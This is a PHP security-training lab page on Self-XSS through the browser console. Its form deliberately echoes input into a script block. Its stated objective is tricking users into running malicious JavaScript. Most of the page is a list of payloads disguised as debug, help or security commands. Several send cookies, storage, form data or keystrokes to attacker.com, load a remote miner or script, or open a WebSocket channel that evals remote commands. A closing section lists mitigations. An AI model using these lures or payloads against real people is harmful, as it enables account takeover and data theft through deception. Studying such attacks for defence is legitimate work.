<?php
// Lab 4: Self-XSS via Browser Console
// Vulnerability: Self-XSS through browser developer tools

session_start();

$message = '';
$user_input = '';
$executed_code = '';

// Simulate Self-XSS vulnerability through browser console
function process_console_xss($input) {
    // Vulnerable: Direct output without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}

// Handle Self-XSS
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['execute_code'])) {
    $user_input = $_POST['code_input'] ?? '';
    
    if ($user_input) {
        $executed_code = process_console_xss($user_input);
        $message = '<div class="alert alert-success">Code executed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Self-XSS via Browser Console - Self-XSS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .executed-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .console-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .console-example {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Self-XSS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Self-XSS via Browser Console</h1>
            <p class="hero-subtitle">Self-XSS through browser developer tools</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates Self-XSS vulnerabilities that are exploited through browser developer tools and console. Attackers trick users into opening the browser console and executing malicious JavaScript code, often disguised as debugging commands or helpful scripts.</p>
            <p><strong>Objective:</strong> Use browser console techniques to trick users into executing malicious JavaScript.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct output without validation
function process_console_xss($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-terminal me-2"></i>Console Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="console-warning">
                            <h5>⚠️ Console Warning</h5>
                            <p>This lab demonstrates console attacks. Common techniques include:</p>
                            <ul>
                                <li>Tricking users to open browser console</li>
                                <li>Disguising malicious code as debugging commands</li>
                                <li>Using legitimate-looking console commands</li>
                                <li>Exploiting console functionality</li>
                            </ul>
                        </div>
                        
                        <div class="console-example">
                            <h5>🖥️ Console Example</h5>
                            <p><strong>Fake Debug Command:</strong></p>
                            <p>"Open console and run: <code>console.log('Debug started')</code>"</p>
                            <p><strong>Fake Help Command:</strong></p>
                            <p>"Press F12 and type: <code>alert('Help loaded')</code>"</p>
                        </div>
                        
                        <div class="input-info">
                            <h5>Console Examples</h5>
                            <p>Try these console payloads:</p>
                            <ul>
                                <li><code>console.log('Console test')</code> - Console output</li>
                                <li><code>alert('Console executed')</code> - Alert message</li>
                                <li><code>document.title = 'Console'</code> - Change title</li>
                                <li><code>document.body.innerHTML = 'Console!'</code> - Change content</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="execute_code" value="1">
                            <div class="mb-3">
                                <label for="code_input" class="form-label">JavaScript Code to Execute</label>
                                <textarea class="form-control" id="code_input" name="code_input" 
                                          rows="4" placeholder="Enter JavaScript code..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Code</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($executed_code): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Executed Code
                    </div>
                    <div class="card-body">
                        <div class="executed-display">
                            <h5>JavaScript Output</h5>
                            <div class="sensitive-data">
                                <script>
                                    try {
                                        <?php echo $executed_code; ?>
                                    } catch(e) {
                                        console.error('Error executing code:', e);
                                    }
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Self-XSS via Browser Console</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Console leading to code execution</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Console Techniques</h5>
                    <ul>
                        <li><strong>Debug Commands:</strong> Disguise as debugging commands</li>
                        <li><strong>Help Commands:</strong> Use legitimate-looking help commands</li>
                        <li><strong>Console Output:</strong> Exploit console functionality</li>
                        <li><strong>Developer Tools:</strong> Trick users to open dev tools</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Console Self-XSS Payloads</h5>
            <p>Use these console techniques to trick users into executing malicious JavaScript:</p>
            
            <h6>1. Fake Debug Commands:</h6>
            <div class="code-block">// Open console and run:
console.log('Debug mode enabled!')

// Press F12 and type:
alert('Debug started!')

// Console command:
document.title = 'Debug mode!'

// Developer tools command:
document.body.innerHTML = 'Debug mode enabled!'</div>

            <h6>2. Fake Help Commands:</h6>
            <div class="code-block">// Open console and run:
console.log('Help loaded!')

// Press F12 and type:
alert('Help activated!')

// Console command:
document.title = 'Help enabled!'

// Developer tools command:
document.body.innerHTML = 'Help enabled!'</div>

            <h6>3. Fake Error Fix Commands:</h6>
            <div class="code-block">// Open console and run:
console.log('Error fixed!')

// Press F12 and type:
alert('Error resolved!')

// Console command:
document.title = 'Fixed!'

// Developer tools command:
document.body.innerHTML = 'Error resolved!'</div>

            <h6>4. Fake Security Commands:</h6>
            <div class="code-block">// Open console and run:
console.log('Security enabled!')

// Press F12 and type:
alert('Security activated!')

// Console command:
document.title = 'Security enabled!'

// Developer tools command:
document.body.innerHTML = 'Security enabled!'</div>

            <h6>5. Fake Update Commands:</h6>
            <div class="code-block">// Open console and run:
console.log('Update complete!')

// Press F12 and type:
alert('Update applied!')

// Console command:
document.title = 'Updated!'

// Developer tools command:
document.body.innerHTML = 'Updated!'</div>

            <h6>6. Fake Maintenance Commands:</h6>
            <div class="code-block">// Open console and run:
console.log('Maintenance complete!')

// Press F12 and type:
alert('Maintenance done!')

// Console command:
document.title = 'Maintained!'

// Developer tools command:
document.body.innerHTML = 'Maintenance complete!'</div>

            <h6>7. Fake Data Backup Commands:</h6>
            <div class="code-block">// Open console and run:
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/backup', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})
console.log('Data backed up!')
alert('Data backed up!')</div>

            <h6>8. Fake Form Security Commands:</h6>
            <div class="code-block">// Open console and run:
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
    })
}
console.log('Forms secured!')
alert('Forms secured!')</div>

            <h6>9. Fake Keylogger Commands:</h6>
            <div class="code-block">// Open console and run:
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key)
})
console.log('Keystroke monitoring enabled!')
alert('Keystroke monitoring enabled!')</div>

            <h6>10. Fake Session Security Commands:</h6>
            <div class="code-block">// Open console and run:
var sessionData = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/session', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(sessionData)
})
console.log('Session secured!')
alert('Session secured!')</div>

            <h6>11. Fake Cryptocurrency Commands:</h6>
            <div class="code-block">// Open console and run:
var script = document.createElement('script')
script.src = 'https://attacker.com/miner.js'
document.head.appendChild(script)
console.log('Mining started!')
alert('Mining started!')</div>

            <h6>12. Fake Reverse Shell Commands:</h6>
            <div class="code-block">// Open console and run:
var ws = new WebSocket('ws://attacker.com:8080')
ws.onopen = function() {
    ws.send('Connected')
}
ws.onmessage = function(event) {
    eval(event.data)
}
console.log('Remote support connected!')
alert('Remote support connected!')</div>

            <h6>13. Fake Persistence Commands:</h6>
            <div class="code-block">// Open console and run:
var payload = 'alert("Persistent!")'
localStorage.setItem('persistent', payload)
if (localStorage.getItem('persistent')) {
    eval(localStorage.getItem('persistent'))
}
console.log('Persistence enabled!')
alert('Persistence enabled!')</div>

            <h6>14. Fake DOM Security Commands:</h6>
            <div class="code-block">// Open console and run:
var element = document.createElement('div')
element.id = 'security'
element.innerHTML = '<script>alert("DOM secured!")</script>'
document.body.appendChild(element)
console.log('DOM secured!')
alert('DOM secured!')</div>

            <h6>15. Fake Event Handler Commands:</h6>
            <div class="code-block">// Open console and run:
var element = document.createElement('div')
element.onclick = function() { alert('Event secured!') }
element.innerHTML = 'Click to verify security'
element.style.cssText = 'background: green; color: white; padding: 10px; cursor: pointer;'
document.body.appendChild(element)
console.log('Events secured!')
alert('Events secured!')</div>

            <h6>16. Fake CSS Security Commands:</h6>
            <div class="code-block">// Open console and run:
var style = document.createElement('style')
style.innerHTML = 'body { background: linear-gradient(45deg, #00ff00, #008000) !important; }'
document.head.appendChild(style)
console.log('CSS secured!')
alert('CSS secured!')</div>

            <h6>17. Fake Advanced Security Commands:</h6>
            <div class="code-block">// Open console and run:
(function() {
    var script = document.createElement('script')
    script.src = 'https://attacker.com/security.js'
    document.head.appendChild(script)
    console.log('Advanced security loaded!')
    alert('Advanced security loaded!')
})()</div>

            <h6>18. Fake Complete Security Suite:</h6>
            <div class="code-block">// Open console and run:
console.log('Security Suite v4.0 loaded!')
alert('Security Suite v4.0 loaded!')

// Keylogger
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key)
})

// Form hijacking
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
    })
}

// Data exfiltration
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/backup', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})

console.log('Complete security suite activated!')
alert('Complete security suite activated!')</div>

            <h6>19. Fake Data Exfiltration Commands:</h6>
            <div class="code-block">// Open console and run:
var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href,
    referrer: document.referrer
}
fetch('https://attacker.com/backup', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})
console.log('All data backed up!')
alert('All data backed up!')</div>

            <h6>20. Fake Form Hijacking Commands:</h6>
            <div class="code-block">// Open console and run:
var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        e.preventDefault()
        var data = new FormData(this)
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        })
        alert('Form secured!')
    })
}
console.log('All forms secured!')
alert('All forms secured!')</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Social engineering and user manipulation</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Session hijacking and account takeover</li>
                <li>Malicious redirects and phishing attacks</li>
                <li>Keylogging and form hijacking</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use Content Security Policy (CSP) to prevent code execution</li>
                    <li>Implement proper output encoding</li>
                    <li>Use whitelist-based filtering for allowed content</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual JavaScript execution patterns</li>
                    <li>Educate users about Self-XSS risks and console attacks</li>
                    <li>Implement user awareness training programs</li>
                    <li>Warn users about executing code in browser console</li>
                    <li>Disable console access in production environments</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
